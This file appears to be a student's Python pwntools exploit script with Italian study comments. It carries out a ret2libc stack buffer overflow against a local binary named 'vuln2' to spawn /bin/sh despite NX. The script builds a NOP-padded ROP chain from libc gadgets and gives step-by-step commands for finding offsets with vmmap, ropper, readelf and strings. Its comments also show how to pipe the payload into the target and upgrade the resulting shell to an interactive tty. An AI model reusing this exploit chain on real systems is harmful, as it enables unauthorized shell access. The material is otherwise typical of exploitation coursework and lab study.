#Quando NX è abilitato
import sys
import struct
from pwn import *

#p64 lo uso perchè gli indirizzi non sono quelli che si aspetta il sistema, quindi li mette in un formato giusto e funzionante

# nop slides, così sto sicuro, sovrascrivo il buffer
nops = b"\x90"*216

#una volta che scopro l'indirizo di base della libc posso trovare facilmente dove sono le altre funzioni del sistema operativo con offset predeterminati
#quindi posso fare un ROP e fare eseguire system e poi passarlgli bin sh 
#se ho che lo stack non è eseguibile questo devo metterlo nei registri direttamente (RDI con la funzione pop_rdi)

#quindi faccio run senza parametri 

# come trovo il base pointer di libc, con vmmap
#la prima volta che trovo libc ho trovato il suo indirizzo base

#trovato con vmmap



# b *main e run con qualsiasi input
# vmmap     per vedere la mappatura in gdb

#### PRENDERE IL PRIMO CHE C'é CHE HA libc-2.31.so  in questo caso , con START
libc_base_address = 0x00007ffff7dc4000
"""un altro modo per trovarlo è  ldd vuln2 e vedo l'indirizzo in cui viene caricata ma se ho le variabili di ambiente non funziona perchè mi sfasa gli indirizzi"""




#per trovare il pop_rdi dove sta ( mi serve per mettere dentro il rdi quello che voglio fare eseguire)
#ldd vuln2 e vedo il path di libc

#lo prendo da libc 
#ritorna sempre un offset che devo sommare all'indirizzo di base
#ropper --file  path_del_file_lib_c --search "pop rdi; ret;"

#nei sistemi 64 bit mi serve caricare l'argomento sui registri (perchè l'esecuzione deve essere fatta dai registri)
#voglio eseguire system bin sh (shell)
#per caricare in system bin sh devo mettere il parametro sullo stack ma deve passare sul registro e quindi uso pop_rdi return (pop rdi; ret;)
#di solito lo trovo nel binario quasi sempre se no devo prenderlo nella libc (come in questo caso)
pop_rdi = p64(libc_base_address + 0x23b6a)


#vedo dove si strova la chiamata alla funzione system nel sistema
#per farlo uso readelf
#readelf -s path_lib_c | grep "system"  e prendo l'offset che mi ritorna
system = p64(libc_base_address + 0x52290)


#per prendere dove si trova bin sh faccio
#strings -a -t x path_libc | grep  "/bin/sh"
bin_sh = p64(libc_base_address + 0x1b45bd)


#ropper --file path_libc  --search "ret;"
ret = p64(libc_base_address + 0xbe2f9)
#creo il payload 
#prima le nops 
#poi il pop_rdi per caricare bin_sh in stack e poi la funzione che voglio eseguire

#potrei aggiungere una funzione per evitare che vado in segmentation e rimanere in modo stealth 
#trovo la exit funtion
#objdump -D vuln2 | grep exit (se c'è nel codice se no prendo l'indirizzo del return con gdb disass main e prendere l'indirizzo della leave)

#per allineare lo stack in casi dii problemi (se mi da seg fault ) devo aggiungere un gadget ret prima di pop_rdi

#con nops raggioungo eip e lo sovrascrivo poi con ret, poi faccio pop_rdi mettendoci dentro bin sh e poi eseguo systems
sys.stdout.buffer.write(nops + ret + pop_rdi + bin_sh + system)



#il programma vuole che gli passo le cose in input e posso farlo così

################ USARE QUESTO 
# (python3 exploit.py; cat) | ./vuln2

#oppure metto l'output in un file txt e faccio ./vuln2 < output.txt


#se c'è qualcosa che prima di chiamare system disallinea lo stack (in cima allo stack mi trovo un indirizzo di memoria non multiplo di 16 dà segmentation fault)











#gdb mi permette di atatccarmi ad un processo in esecuzione
## (python3 exploit.py; cat) | ./vuln2
# ps aux | grep vuln2

#sudo gdb -p "id proc" -q

# e vado a mettere un break point 



#una volta dentro la shell per migliorarla faccio python3 -c 'import pty; pty.spawn("/bin/bash")' poi ctrl+z poi stty raw -echo; fg poi invio 2 volte